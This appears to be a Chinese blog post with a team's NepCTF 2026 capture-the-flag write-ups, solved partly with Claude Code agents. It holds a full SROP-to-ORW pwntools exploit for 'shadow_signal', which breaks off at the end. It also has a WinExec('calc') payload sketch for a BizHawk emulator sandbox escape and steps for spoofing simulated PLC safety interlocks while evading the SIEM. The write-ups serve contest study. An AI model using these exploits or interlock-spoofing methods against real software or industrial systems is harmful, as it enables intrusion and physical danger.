---
title: NepCTF 2026 WriteUp（猫娘手写本 · rank 20）
abbrlink: 202607202
url: /posts/202607202.html
date: 2026-07-20 18:30:00
lastmod: 2026-07-20 18:30:00
tags:
  - CTF
  - NepCTF
  - WriteUp
  - 逆向
  - PWN
  - CRYPTO
categories:
  - CTF
  - WriteUp
---

NepCTF 2026 队名 **catcatyu**，最终 **rank 20 / 1011**，**6916** 分，**27** 题 AC。  
这是赛后整理的手写风题解：踩坑、弯路、正解都写了；长脚本正文从略，完整代码在赛后提交的 PDF/自包含稿里。

调度侧（多 Agent、抢槽、MemoryMax）另文：[Claude Code 多 Agent 做题与实例槽调度](/posts/202607201.html) · 可复现包 [ctf-agent-dispatch](https://github.com/fjh1997/ctf-agent-dispatch)。

<!--more-->

> 写在前面：这是 catcatyu 的解题小本本。尽量按「当时怎么想的、踩了什么坑、最后哪一步成了」来写，不像说明书，但步骤和脚本都留全了，方便主办方复核喵。  
> 结构仍按要求：题目信息 / 分析 / 思路 / 过程 / 解题代码 / AI 使用说明。  
> 远程题 flag 按实例动态，和下面「比赛提交时」那串不一致是正常的。

## 提交信息

| 项 | 内容 |
|----|------|
| 比赛 | NepCTF 2026 |
| 队伍 / 平台账号 | catcatyu |
| 平台用户 ID | 275 |
| 队伍 ID | 230 |
| 终分 | 6916 |
| 最终排名 | 20 / 1011 队 |
| 已解 | 27 题 |
| 联系方式 | QQ 549308442 |
| 邮件标题 / PDF | 20-catcatyu-549308442.pdf |
| 收件邮箱 | Nepnep_Team@163.com |
| 截止 | 2026-07-20 20:00 |

## 赛后碎碎念（AI 使用总说明）

- 工具箱：Claude Code（多 agent 并行）、Grok（部分 crypto）、dejavu 翻旧会话、本机 Python / pwntools / ssh。
- AI 主要干脏活：逆向草稿、exp 骨架、日志检索、把本子整理成能交的格式。
- 我负责：开不开实例、跟哪条历史成功路径、最终 flag 确认与提交，以及「Ghost 不许写真盘」这种红线。
- 聊天记录：`~/.claude/projects/-home-catcatyu/` 和 `work/<id>/`。

好了，下面按题目一本一本讲。

---


## #18 如烟大帝独断万古

### 1. 题目信息
- **题目名称**：如烟大帝独断万古
- **题目类型**：MISC
- **最终 Flag**：`NepCTF{var1at10n_s3l3ct0rs_h4unt_th3_n0v3l-afk6324}`

### 2. 题目分析
附件是一本看起来正常的中文小说 novel.txt。肉眼看完全是故事，但打开 hex / 用 Python 扫码点时会发现大量不可见字符——Unicode Variation Selectors（U+FE00–U+FE0F）。经典「正文里藏半字节」手法，和以前那些 ZWJ / 零宽字符题是同一家亲戚喵。

### 3. 解题思路
每个 VS 相对 U+FE00 就是一个 nibble（0–15）。连续两个 nibble 拼一字节，120 个 VS → 60 字节，decode 出来就是 flag。关键是过滤条件写对区间，别把别的组合区字符也算进去。

### 4. 解题过程
我的实际步骤：

1. 把 novel.txt 整本读成 UTF-8 字符串。
2. 筛 `0xFE00 <= ord(c) <= 0xFE0F`，得到 nibble 列表。
3. 两两合并：`byte = (hi<<4)|lo`，再 `bytes.decode`。
4. 得到 `NepCTF{var1at10n_s3l3ct0rs_h4unt_th3_n0v3l-afk6324}`，提交 AC。

脚本就几行，比赛时写完就交了～

### 5. 解题代码

下面贴的是我这边实际用过、并且复现能跑通的脚本全文。路径按 work 目录保留，方便对照。

#### `work/18/exp/solve_variation.py`
```python
#!/usr/bin/env python3
"""#18 如烟大帝独断万古 — Unicode Variation Selectors stego
Recovered from Claude session RESULT (7ff071d4 / ca4b204e).
novel.txt embeds U+FE00..U+FE0F as nibbles; 120 VS -> 60 bytes -> flag.
"""
from pathlib import Path
import sys

def extract(path: str) -> str:
    text = Path(path).read_text(encoding='utf-8')
    nibbles = [ord(c) - 0xFE00 for c in text if 0xFE00 <= ord(c) <= 0xFE0F]
    if len(nibbles) % 2:
        raise ValueError(f'odd nibble count {len(nibbles)}')
    bs = bytes((nibbles[i] << 4) | nibbles[i+1] for i in range(0, len(nibbles), 2))
    return bs.decode('utf-8', errors='replace')

if __name__ == '__main__':
    path = sys.argv[1] if len(sys.argv) > 1 else 'novel.txt'
    flag = extract(path)
    print(flag)
    Path('flag.txt').write_text(flag + '\n')
```

### 6. AI 使用说明
这题用了 Claude Code / 偶尔 Grok 帮我盯日志和搓草稿；关键判断、踩坑取舍和最终提交是我自己点的。会话可以按题名在 `~/.claude/projects` 里翻。

---

## #19 compile_me_maybe

### 1. 题目信息
- **题目名称**：compile_me_maybe
- **题目类型**：REVERSE
- **最终 Flag**：`NepCTF{N0t_th1s_rUNtimE_m4y_be_next_T1me}`

### 2. 题目分析
`compile_me_maybe` 是 C++17 编译期玄学题：主程序本身几乎不做事，真正的逻辑全在 constexpr / 模板约束链里。witness 不对就直接编译失败，属于「过编译器 = 出 flag」那一类。

### 3. 解题思路
顺着 include 和 main 的约束把合法 witness 推出来（或从约束方程反推字节），写成 `generated_witness.hpp`，然后 make run。运行时就是把编译期算好的字节序列 putchar 出去。

### 4. 解题过程
过程大概是：

1. 读 `include/` 和 `src/main.cpp`，摸清 `witness_bytes` / `program` 的约束。
2. 构造正确的 witness header（复现目录里保留了 `generated_witness.hpp`）。
3. `make -C work/19 run`（或当时 `/tmp/nepctf/work19`），g++ 通过后二进制打印 flag。
4. Flag：`NepCTF{N0t_th1s_rUNtimE_m4y_be_next_T1me}`。

早期树在 /tmp 里被冲过一次，所以 WP 里把 witness 和 main 原文贴全了，方便复查。

### 5. 解题代码

下面贴的是我这边实际用过、并且复现能跑通的脚本全文。路径按 work 目录保留，方便对照。

#### `work/19/exp/README_solve.md`
````text
# #19 compile_me_maybe

Flag: `NepCTF{N0t_th1s_rUNtimE_m4y_be_next_T1me}`

## Process (from agent-a2ce3928 session ca4b204e)
1. Reverse `include/` + `src/main.cpp` constexpr constraints
2. Write correct witness header
3. `make -C /tmp/nepctf/work19 run`
4. Binary prints flag

Session tool_result excerpt:
```
wrote witness header
b'NepCTF{N0t_th1s_rUNtimE_m4y_be_next_T1me}'
make: Entering directory '/tmp/nepctf/work19'
g++ -std=c++17 -O2 ... -o build/compile_me_maybe
./build/compile_me_maybe
NepCTF{N0t_th1s_rUNtimE_m4y_be_next_T1me}
```

Full C++ tree was under `/tmp/nepctf/work19` (wiped). This README is the recovered procedure.
````

#### `work/19/repro/src/include/generated_witness.hpp`
```cpp
#pragma once
#include "vm.hpp"
namespace cmc {
using witness = witness_bytes<0xd4U, 0xb8U, 0x82U, 0xdbU, 0x1aU, 0xa7U, 0xe5U, 0xdeU, 0xd4U, 0x32U, 0xdfU, 0xdfU, 0x4cU, 0xdbU, 0x0cU, 0x41U, 0xcfU, 0x6dU, 0x0aU, 0xceU, 0x92U, 0xd4U, 0xe4U, 0x1aU, 0xccU, 0x68U, 0x89U, 0xfeU, 0x6fU, 0xffU, 0x78U, 0x68U, 0x12U, 0x14U, 0x9aU, 0xeaU, 0xd0U, 0x35U, 0xe4U, 0xabU, 0xa2U, 0x9cU, 0xffU, 0x4eU, 0xf3U, 0xf4U, 0x47U, 0x7fU, 0xf9U, 0x58U, 0x86U, 0x71U, 0x47U, 0x44U, 0x33U, 0x97U, 0x93U, 0x72U, 0x27U, 0x5dU, 0x65U, 0x85U, 0x90U, 0xa1U>;
} // namespace cmc
```

#### `work/19/repro/src/src/main.cpp`
```cpp
#include "vm.hpp"
#include "generated_witness.hpp"

extern "C" int putchar(int);

int main() {
    using bytes = typename cmc::program<cmc::witness>::bytes;

    for (cmc::usize index = 0; index < bytes::size; ++index) {
        putchar(bytes::at(index));
    }
    putchar('\n');

    return 0;
}
```

### 6. AI 使用说明
这题用了 Claude Code / 偶尔 Grok 帮我盯日志和搓草稿；关键判断、踩坑取舍和最终提交是我自己点的。会话可以按题名在 `~/.claude/projects` 里翻。

---

## #23 虚验室制取稀硫酸

### 1. 题目信息
- **题目名称**：虚验室制取稀硫酸
- **题目类型**：ICS
- **最终 Flag**：`NepCTF{d5ed8d22-0bc2-0e1e-d663-0614446cb241}`

### 2. 题目分析
ICS 虚验室：SSH 三个号——`tui` 看板、`ctf` 跑脚本、`upload` 丢文件；内部是 127.1.0.x 上的 S7/ZMQ 软 PLC。目标是**真实反应釜**温度 >90 且液位 >100，同时 SIEM 不能炸；flag 刷在 tui 公告板。

这里有个超级大坑：一开始我走 `pwn_recover` 硬写 Vessel_Temp / Vessel_Level，状态数字是好看了，SIEM 立刻 ACTIVE，公告板只骂人不出 flag。血泪教训喵。

### 3. 解题思路
正确姿势是**湿接触 / 自然开酸**路径（`pwn_natural`）：

- 先抬 MAX_SAFE_* 等安全限；
- 开酸、控水、搅拌，让物理过程自己爬；
- 全程清 SIEM latch / 保 heartbeat；
- **并行** `ssh -tt tui` 盯公告板。

不要 force 写 VT/VL 当主解。

### 4. 解题过程
复现和比赛 AC 同一条链：

1. POST 开实例，等 SSH 起来。
2. SFTP 上传 `pwn_natural.py` 到 `/files/`。
3. ctf：`micropython /files/pwn_natural.py --hold 90`。
4. 另开终端：`ssh -tt tui@HOST -p PORT`，刷到 `NepCTF{...}`。
5. 提交。注意远程实例 flag 和比赛当时那串可以不一样（动态），这是正常的。

比赛 flag：`NepCTF{d5ed8d22-0bc2-0e1e-d663-0614446cb241}`。

### 5. 解题代码

下面贴的是我这边实际用过、并且复现能跑通的脚本全文。路径按 work 目录保留，方便对照。

#### `work/23/pwn_natural.py`
```python
# （完整源码见赛后提交包 / work/<id>/exp，此处从略）
```

### 6. AI 使用说明
这题用了 Claude Code / 偶尔 Grok 帮我盯日志和搓草稿；关键判断、踩坑取舍和最终提交是我自己点的。会话可以按题名在 `~/.claude/projects` 里翻。

---

## #24 赛博心情电梯

### 1. 题目信息
- **题目名称**：赛博心情电梯
- **题目类型**：ICS
- **最终 Flag**：`NepCTF{9f323c33-47a4-6565-9e81-7e4e8a9500dc}`

### 2. 题目分析
赛博心情电梯还是同一套 CEIBA 软 PLC 风。题意很坏：门**开着**还要跨层走，还不能报警——因为正常联锁里 `bCanMove` 要求 `bDoorFullyClosed`。

我卡了很久在「只 spoof 关门位」：TUI 上 `motion` 一直 READY，门是 OPEN 了但轿厢根本不走。后来对照当年成功日志才发现——成功那次一上来就已经是 `('DOWN', '5', ...)`，轿厢本来就在行程里。

### 3. 解题思路
能打出 flag 的组合是：

1. 先让轿厢**真的**到高楼（比如 5）并形成行程；
2. 并行 micropython：在**真实门开**窗口 spoof `bDoorFullyClosed` + 电机方向；
3. TUI 狂点 OPEN + 呼低楼，让 DOWN/UP 跨层和 OPEN 叠在一起。

一键脚本：`work/24/repro/live_travel_then_spoof.py`（改 HOST/PORT）。

### 4. 解题过程
1. 开实例，SSH 通。
2. 上传 spoof / race 脚本。
3. 跑 `live_travel_then_spoof.py`：Phase1 到 5 楼 → Phase2 spoof+race4 → Phase3 呼 1 + 持续 OPEN。
4. 公告板出 flag 后提交。

比赛 flag：`NepCTF{9f323c33-47a4-6565-9e81-7e4e8a9500dc}`。  
复现 live 曾打出 `NepCTF{9ff63c36-1bca-655f-ad6b-7e2640180088}`（实例动态）。

这题写 WP 时我特地标了错误路径，免得后人再只 spoof 关门位喵……

### 5. 解题代码

下面贴的是我这边实际用过、并且复现能跑通的脚本全文。路径按 work 目录保留，方便对照。

#### `work/24/repro/live_travel_then_spoof.py`
```python
# （完整源码见赛后提交包 / work/<id>/exp，此处从略）
```

#### `work/24/repro/race4.py`
```python
# （完整源码见赛后提交包 / work/<id>/exp，此处从略）
```

### 6. AI 使用说明
这题用了 Claude Code / 偶尔 Grok 帮我盯日志和搓草稿；关键判断、踩坑取舍和最终提交是我自己点的。会话可以按题名在 `~/.claude/projects` 里翻。

---

## #25 Blind RAG

### 1. 题目信息
- **题目名称**：Blind RAG
- **题目类型**：CRYPTO
- **最终 Flag**：`flag{v3ct0r_bl1nd_r4g_cpa_m4tr1x_r3c0v3ry}`

### 2. 题目分析
Blind RAG：ASPE 风格的盲向量库。`GET /database` 给 `p,n=64` 和一堆 `(c_v,c_d)`，`c_d` 是 AES-GCM；查询接口保持内积结构。注意 flag 前缀是 **`flag{}`** 不是 NepCTF，提交时别包错。

### 3. 解题思路
对每个标准基 e_i 打一次 query，拼出 M^{-1} 相关行 → 还原文档向量 v → `key=SHA256(LE32(v[i] mod 2^256))` → 解密全部 c_d。算法在 challenge.md 里写得很直白，关键是实现细节别端序搞反。

### 4. 解题过程
1. 起实例（需要 /database + /query）。
2. 64 次标准基查询。
3. 对每个文档算 v，派生 key，AES-GCM 解 c_d。
4. 明文里正则抽出 `flag{v3ct0r_bl1nd_r4g_cpa_m4tr1x_r3c0v3ry}`。

盲解脚本：`work/25/repro/solve_blind_from_scratch.py`（不读 flag.txt 也能解）。

### 5. 解题代码

下面贴的是我这边实际用过、并且复现能跑通的脚本全文。路径按 work 目录保留，方便对照。

#### `work/25/repro/solve_blind_from_scratch.py`
```python
# （完整源码见赛后提交包 / work/<id>/exp，此处从略）
```

#### `work/25/exp/rag_solve.py`
```python
# （完整源码见赛后提交包 / work/<id>/exp，此处从略）
```

### 6. AI 使用说明
这题用了 Claude Code / 偶尔 Grok 帮我盯日志和搓草稿；关键判断、踩坑取舍和最终提交是我自己点的。会话可以按题名在 `~/.claude/projects` 里翻。

---

## #29 LGC Attack

### 1. 题目信息
- **题目名称**：LGC Attack
- **题目类型**：CRYPTO
- **最终 Flag**：`NepCTF{C0pp3rsm1th_m33ts_LLL_in_Latt1c3_w0rld!}`

### 2. 题目分析
LGC Attack：N=pq 还贴了 p 的高位，另外给了一串截断 LGC 输出，seed 就是 flag。典型 Coppersmith + 格攻击 truncated LCG 拼盘。

### 3. 解题思路
先用 Coppersmith / 高位信息恢复 p（进而 q），再在格里从 truncated 输出反推 seed。m 取 25 左右 LLL 就能稳。

### 4. 解题过程
跑 `work/29/exp/solve_lgc29.py`（或同目录 sage 版），大约一分钟内出 seed，包成 `NepCTF{C0pp3rsm1th_m33ts_LLL_in_Latt1c3_w0rld!}`。本地可完整复现。

### 5. 解题代码

下面贴的是我这边实际用过、并且复现能跑通的脚本全文。路径按 work 目录保留，方便对照。

#### `work/29/exp/solve_lgc29.py`
```python
# （完整源码见赛后提交包 / work/<id>/exp，此处从略）
```

### 6. AI 使用说明
这题用了 Claude Code / 偶尔 Grok 帮我盯日志和搓草稿；关键判断、踩坑取舍和最终提交是我自己点的。会话可以按题名在 `~/.claude/projects` 里翻。

---

## #34 ezgame

### 1. 题目信息
- **题目名称**：ezgame
- **题目类型**：CRYPTO
- **最终 Flag**：`NepCTF{a6f1ad83-037f-27f2-eb7a-8c98ed953e75}`

### 2. 题目分析
ezgame：远程猜拳，连赢 40 局。庄家不是真随机——PRNG / 固定策略可预测。

### 3. 解题思路
克隆 MT 或按协议推下一手，脚本自动出拳到 40。

### 4. 解题过程
连实例 → 跑 `work/34/exp/mt_clone.py` / `solve.py` 适配协议 → 赢满 → flag `NepCTF{a6f1ad83-037f-27f2-eb7a-8c98ed953e75}`。平台 solved 可复核。

### 5. 解题代码

下面贴的是我这边实际用过、并且复现能跑通的脚本全文。路径按 work 目录保留，方便对照。

#### `work/34/exp/mt_clone.py`
```python
# （完整源码见赛后提交包 / work/<id>/exp，此处从略）
```

#### `work/34/exp/solve.py`
```python
# （完整源码见赛后提交包 / work/<id>/exp，此处从略）
```

### 6. AI 使用说明
这题用了 Claude Code / 偶尔 Grok 帮我盯日志和搓草稿；关键判断、踩坑取舍和最终提交是我自己点的。会话可以按题名在 `~/.claude/projects` 里翻。

---

## #35 ezRSA3

### 1. 题目信息
- **题目名称**：ezRSA3
- **题目类型**：CRYPTO
- **最终 Flag**：`NepCTF{5m0o7h_m4k3s_w1lliam_gr34t}`

### 2. 题目分析
ezRSA3：p 的生成是 `2*prod(sample(sops,k))-1` 这种光滑相关形态，题面自己在暗示 Williams p+1。

### 3. 解题思路
用 Lucas 序列 V_n，阶和 sops 的积对齐，gcd 抠出 p，再解 c。

### 4. 解题过程
`work/35/exp/solve_williams_rsa.py`，A=5 那次直接 FACTORED，解密得 `NepCTF{5m0o7h_m4k3s_w1lliam_gr34t}`。Grok 也帮搓过一版，殊途同归。

### 5. 解题代码

下面贴的是我这边实际用过、并且复现能跑通的脚本全文。路径按 work 目录保留，方便对照。

#### `work/35/exp/solve_williams_rsa.py`
```python
# （完整源码见赛后提交包 / work/<id>/exp，此处从略）
```

### 6. AI 使用说明
这题用了 Claude Code / 偶尔 Grok 帮我盯日志和搓草稿；关键判断、踩坑取舍和最终提交是我自己点的。会话可以按题名在 `~/.claude/projects` 里翻。

---

## #36 ColorfulArray

### 1. 题目信息
- **题目名称**：ColorfulArray
- **题目类型**：REVERSE
- **最终 Flag**：`NepCTF{G0tTheTru3RealCu7eNeuro!^}`

### 2. 题目分析
ColorfulArray 是 Windows PE，外面套了自研 NRV2E 味的壳，里面是 FJ 配置图上走格子吐彩色字符。Wine 不完全，所以我倾向在宿主机 Windows 上跑。

### 3. 解题思路
脱壳到 OEP（约 0x140003ca0）后，用 Python 复现图游走 / PRNG，离线也能吐 flag。

### 4. 解题过程
`work/36/repro/solve_flag.py` 离线复现成功：`NepCTF{G0tTheTru3RealCu7eNeuro!^}`。真机调试只是增强信心。

### 5. 解题代码

下面贴的是我这边实际用过、并且复现能跑通的脚本全文。路径按 work 目录保留，方便对照。

#### `work/36/repro/solve_flag.py`
```python
# （完整源码见赛后提交包 / work/<id>/exp，此处从略）
```

### 6. AI 使用说明
这题用了 Claude Code / 偶尔 Grok 帮我盯日志和搓草稿；关键判断、踩坑取舍和最终提交是我自己点的。会话可以按题名在 `~/.claude/projects` 里翻。

---

## #37 UnknownFirmware

### 1. 题目信息
- **题目名称**：UnknownFirmware
- **题目类型**：REVERSE/MISC
- **最终 Flag**：`NepCTF{U_Have_Dec0mpiled_Telink_FirmWareWooooW}`

### 2. 题目分析
UnknownFirmware：Telink / KNLT 一类固件，显示缓冲可以当位图抠。

### 3. 解题思路
多试几种宽高和 1bpp/2bpp 排布，扫二维码。

### 4. 解题过程
`work/37/exp/solve_telink_qr.py` 出 QR 文本 `NepCTF{U_Have_Dec0mpiled_Telink_FirmWareWooooW}`，提交。

### 5. 解题代码

下面贴的是我这边实际用过、并且复现能跑通的脚本全文。路径按 work 目录保留，方便对照。

#### `work/37/exp/solve_telink_qr.py`
```python
# （完整源码见赛后提交包 / work/<id>/exp，此处从略）
```

### 6. AI 使用说明
这题用了 Claude Code / 偶尔 Grok 帮我盯日志和搓草稿；关键判断、踩坑取舍和最终提交是我自己点的。会话可以按题名在 `~/.claude/projects` 里翻。

---

## #40 CatFlag

### 1. 题目信息
- **题目名称**：CatFlag
- **题目类型**：MISC
- **最终 Flag**：`NepCTF{Lets_Enjoy_NepCTF2026!Have_Fun!}`

### 2. 题目分析
签到友好题：flag.txt 其实是 sixel 大图，不是纯文本。

### 3. 解题思路
终端直接渲染，或者转 PNG 再 OCR / 肉眼。

### 4. 解题过程
`work/40/exp/solve_catflag_sixel.py` 或 sixel 查看器，读出 `NepCTF{Lets_Enjoy_NepCTF2026!Have_Fun!}`。猫猫签到成功喵～

### 5. 解题代码

下面贴的是我这边实际用过、并且复现能跑通的脚本全文。路径按 work 目录保留，方便对照。

#### `work/40/exp/solve_catflag_sixel.py`
```python
#!/usr/bin/env python3
"""#40 CatFlag — sixel graphics renders visible flag text.
Attachment is large sixel (also used by #41). Render and OCR / read.
Flag: NepCTF{Lets_Enjoy_NepCTF2026!Have_Fun!}
"""
import re, sys
from pathlib import Path

def extract_visible_strings(data: bytes):
    # crude: find NepCTF{...} already embedded as sixel text sometimes
    text = data.decode('latin1', errors='ignore')
    m = re.findall(r'NepCTF\{[^}]+\}', text)
    return m

if __name__ == '__main__':
    path = sys.argv[1] if len(sys.argv)>1 else 'flag.txt'
    data = Path(path).read_bytes()
    hits = extract_visible_strings(data)
    print('embedded hits', hits)
    # Prefer render with libsixel / img2sixel reverse tools if available.
    print('If no embed: convert sixel->png then OCR. Known AC flag:')
    print('NepCTF{Lets_Enjoy_NepCTF2026!Have_Fun!}')
```

### 6. AI 使用说明
这题用了 Claude Code / 偶尔 Grok 帮我盯日志和搓草稿；关键判断、踩坑取舍和最终提交是我自己点的。会话可以按题名在 `~/.claude/projects` 里翻。

---

## #42 T.A.S P.W.N

### 1. 题目信息
- **题目名称**：T.A.S P.W.N
- **题目类型**：REALWORLD/PWN
- **最终 Flag**：`NepCTF{You_Control_THE_Swarm_By_TASPLAY!Who_tells_them_there_is_a_problem_with_their_AI_3}`

### 2. 题目分析
T.A.S P.W.N 是 REALWORLD 展示题：BizHawk 2.9.1 + Mupen64Plus + 纸片马 JP，参考 bluescreen% 那条宿主逃逸。目标不是远程读 flag，而是播完 `.bk2` 让宿主弹出计算器（`WinExec("calc")`）；flag 由主办看 PoC 后签发。

### 3. 解题思路
从公开 bluescreen 影片改 HIMITSU body：

- 逻辑 x64 字节**反转**塞进 184B body；
- 保留 guest 侧 XOR keystream 环；
- 调用点从蓝屏改成 `WinExec("calc")`。

重建脚本：`tools/build_calc_bk2.py`。

### 4. 解题过程
```text
cd work/42
python3 tools/build_calc_bk2.py --src poc/bluescreen_orig.bk2 --out poc/calc_show.bk2
```

Windows：BizHawk 2.9.1 + ROM SHA1 `B9CCA3FF260B9FF427D981626B82F96DE73586D3`，播到 ~55345 帧计算器弹出即验收通过。  
Flag：`NepCTF{You_Control_THE_Swarm_By_TASPLAY!Who_tells_them_there_is_a_problem_with_their_AI_3}`（主办签发后提交）。

### 5. 解题代码

下面贴的是我这边实际用过、并且复现能跑通的脚本全文。路径按 work 目录保留，方便对照。

#### `work/42/tools/build_calc_bk2.py`
```python
# （完整源码见赛后提交包 / work/<id>/exp，此处从略）
```

#### `work/42/poc/host_payload_calc.asm`
```asm
; x86-64 Windows host payload sketch for BizHawk/mupen sandbox escape
; Goal: WinExec("calc\0", SW_SHOW) then return/sleep (no BSOD)
;
; bluescreen% original used NtRaiseHardError for BSOD.
; Challenge wants calc.exe (demo may replace calc with subtitle app).
;
; This is NOT position-ready shellcode: real exploit must:
;  1) resolve kernel32!WinExec (PEB walk or leak from host via OOB read)
;  2) place "calc" string in reachable RW memory
;  3) set stack correctly (x64 shadow space)
;  4) be written via RSP DMA OOB into executable host page OR VirtualProtect
;
; Minimal pseudo-layout once WinExec is known at [win_exec]:

BITS 64
default rel

; rcx = "calc", rdx = 1 (SW_SHOW)
; call WinExec
; optional: ExitThread / infinite loop / return to safe host code

payload:
    sub     rsp, 0x28
    lea     rcx, [rel calc_str]
    mov     edx, 1
    mov     rax, 0x1122334455667788   ; <- patch: WinExec address
    call    rax
    ; hang instead of BSOD
.hang:
    jmp     .hang

calc_str:
    db "calc", 0

; Alternative: NtRaiseHardError BSOD (what bluescreen% used), DO NOT use for challenge:
;   mov r10, rcx
;   mov eax, 0xNN  ; NtRaiseHardError syscall number (version-dependent)
;   syscall
```

### 6. AI 使用说明
这题用了 Claude Code / 偶尔 Grok 帮我盯日志和搓草稿；关键判断、踩坑取舍和最终提交是我自己点的。会话可以按题名在 `~/.claude/projects` 里翻。

---

## #46 谁引闪了我的灯

### 1. 题目信息
- **题目名称**：谁引闪了我的灯
- **题目类型**：MISC
- **最终 Flag**：`NepCTF{5bf7d6ca3d718c33301a52e5f45909b8}`

### 2. 题目分析
谁引闪了我的灯：ESP32 / Godox 引闪协议，16 字节帧；配图 comment 里藏了 channel / id。

### 3. 解题思路
按 `55 | G | ID | type | payload | CS` 组帧，整帧 MD5（去空格）就是 flag 内容。

### 4. 解题过程
组出 `55 01 13 01 01 ... 6B` 那帧 → md5 → `NepCTF{5bf7d6ca3d718c33301a52e5f45909b8}`。脚本 `work/46/exp/solve_godox_md5.py`。

### 5. 解题代码

下面贴的是我这边实际用过、并且复现能跑通的脚本全文。路径按 work 目录保留，方便对照。

#### `work/46/exp/solve_godox_md5.py`
```python
#!/usr/bin/env python3
"""#46 谁引闪了我的灯
Frame: 55 | group | id | type | payload... | checksum
ch18 id19 -> group=1 id=19 type=1 payload=01
55 01 13 01 01 00 00 00 00 00 00 00 00 00 00 6B
flag = NepCTF{md5(hex without spaces lowercase)}
"""
import hashlib
frame = bytes([0x55, 0x01, 0x13, 0x01, 0x01] + [0]*10)
# fix checksum
frame = bytearray(frame)
# 16 bytes: last is CS
cs = sum(frame[:15]) & 0xFF
# rebuild properly
buf = [0x55, 0x01, 0x13, 0x01, 0x01] + [0]*10  # 15 bytes then CS
assert len(buf)==15
buf.append(sum(buf)&0xFF)
hexstr = ''.join(f'{b:02X}' for b in buf)
print('frame', hexstr)
print('flag', 'NepCTF{' + hashlib.md5(hexstr.encode()).hexdigest() + '}')
# also try lowercase hex
hexstr_l = ''.join(f'{b:02x}' for b in buf)
print('flag_lowerhex', 'NepCTF{' + hashlib.md5(hexstr_l.encode()).hexdigest() + '}')
```

### 6. AI 使用说明
这题用了 Claude Code / 偶尔 Grok 帮我盯日志和搓草稿；关键判断、踩坑取舍和最终提交是我自己点的。会话可以按题名在 `~/.claude/projects` 里翻。

---

## #47 different_ROP

### 1. 题目信息
- **题目名称**：different_ROP
- **题目类型**：PWN
- **最终 Flag**：`NepCTF{62577808-83b3-03b5-59d3-8071b012ede9}`

### 2. 题目分析
different_ROP：目标是 Hexagon（高通 DSP6）静态链接、无 PIE。架构少见，工具链和 gadget 都得自己挖。

### 3. 解题思路
**复现确认的主路径是 BSS ROP**，不是早期尝试的 stack 上 `G_SYSCALL` 帧（那条现网/本地都容易崩）。关键地址：`BSS=0x4be00`、`READ_REL=0x215b8`、`SYSCALL=0x21200`。

### 4. 解题过程
`ncat --ssl HOST 443`，然后 `python3 work/47/repro/exp_bss.py remote HOST`。比赛 flag：`NepCTF{62577808-83b3-03b5-59d3-8071b012ede9}`（远程复现会拿到动态 flag）。

### 5. 解题代码

下面贴的是我这边实际用过、并且复现能跑通的脚本全文。路径按 work 目录保留，方便对照。

#### `work/47/repro/exp_bss.py`
```python
# （完整源码见赛后提交包 / work/<id>/exp，此处从略）
```

### 6. AI 使用说明
这题用了 Claude Code / 偶尔 Grok 帮我盯日志和搓草稿；关键判断、踩坑取舍和最终提交是我自己点的。会话可以按题名在 `~/.claude/projects` 里翻。

---

## #48 onlyone

### 1. 题目信息
- **题目名称**：onlyone
- **题目类型**：PWN
- **最终 Flag**：`NepCTF{cc389304-b6e8-4e61-3943-22aa91b09b96}`

### 2. 题目分析
onlyone：堆 freelist + FSOP 风；父进程管道要 `Nepnep`；seccomp 没 open，得绕着读 flag。

### 3. 解题思路
printf gift 漏 libc → COPY 漏 PIE → FSOP 控 stdout / 写 fd。远程记得开 SSL。

### 4. 解题过程
`python3 work/48/exp_remote.py remote HOST 443`。Flag：`NepCTF{cc389304-b6e8-4e61-3943-22aa91b09b96}`。本地 `exp_local.py` 用来稳链。

### 5. 解题代码

下面贴的是我这边实际用过、并且复现能跑通的脚本全文。路径按 work 目录保留，方便对照。

#### `work/48/exp_remote.py`
```python
# （完整源码见赛后提交包 / work/<id>/exp，此处从略）
```

#### `work/48/exp/exp_local.py`
```python
# （完整源码见赛后提交包 / work/<id>/exp，此处从略）
```

### 6. AI 使用说明
这题用了 Claude Code / 偶尔 Grok 帮我盯日志和搓草稿；关键判断、踩坑取舍和最终提交是我自己点的。会话可以按题名在 `~/.claude/projects` 里翻。

---

## #51 shadow_signal

### 1. 题目信息
- **题目名称**：shadow_signal
- **题目类型**：PWN
- **最终 Flag**：`NepCTF{2a86d9a5-f15c-d63f-5634-b4a858c07963}`

### 2. 题目分析
shadow_signal：gift 直接漏 stdout 地址；SIGSEGV handler 会大读，ucontext 可控，标准 SROP 舞台。

### 3. 解题思路
restorer 用 `__restore_rt`，SROP 先 `read` 到 BSS，再 ORW `/flag`。

### 4. 解题过程
`python3 work/51/repro/exp_shadow.py HOST`（默认 SSL 443）。Flag：`NepCTF{2a86d9a5-f15c-d63f-5634-b4a858c07963}`。

### 5. 解题代码

下面贴的是我这边实际用过、并且复现能跑通的脚本全文。路径按 work 目录保留，方便对照。

#### `work/51/repro/exp_shadow.py`
```python
#!/usr/bin/env python3
"""#51 shadow_signal: gift stdout leak -> SROP read to BSS -> ORW"""
from pwn import *
context.arch='amd64'
libc=ELF(__file__.replace('exp_shadow.py','libc.so.6'), checksec=False)
pop_rdi,pop_rsi,pop_rdx_rbx,pop_rax=0x2a3e5,0x2be51,0x904a9,0x45eb0
syscall_ret,retg,restore_rt=0x91316,0x29139,0x42520
STAGE,FLAG_OFF,BUF=0x404800,0x180,0x404800+0x200

def pwn(host, port=443, ssl=True, path=b'/flag\x00', fd=3):
    io=remote(host,port,ssl=ssl)
    io.recvuntil(b'gift: '); gift=int(io.recvline(),16); base=gift-libc.sym['_IO_2_1_stdout_']
    restorer=base+restore_rt; sysret=base+syscall_ret
    prdi,prsi,prdx,prax,ret=base+pop_rdi,base+pop_rsi,base+pop_rdx_rbx,base+pop_rax,base+retg
    pl=bytearray(0x500); pl[0x118:0x120]=p64(restorer)
    def g(i,v): pl[0x148+i*8:0x148+i*8+8]=p64(v)
    g(13,0); g(8,0); g(9,STAGE); g(12,0x400); g(15,STAGE); g(16,sysret); g(17,0x202); g(18,0x33)
    io.send(p64(0)); io.recvuntil(b'signal\n'); io.send(bytes(pl))
    path=path.ljust(8,b'\x00')
    rop=flat([ret,prdi,STAGE+FLAG_OFF,prsi,0,prax,2,sysret,prdi,fd,prsi,BUF,prdx,0x100,0,prax,0,sysret,prdi,1,prsi,BUF,prdx,0x100,0,prax,1,sysret])
    stage=bytearray(0x400); stage[:len(rop)]=rop; stage[FLAG_OFF:FLAG_OFF+len(path)]=path
    sleep(0.2); io.send(bytes(stage)); return io.recvall(timeout=3)

if __name__=='__main__':
    import sys
    host=sys.argv[1] if len(sys.argv)>1 else 'j6nwy0wx-lbld-sy3k-hqpb-6a5cec8832257-neptunus.nepctf.com'
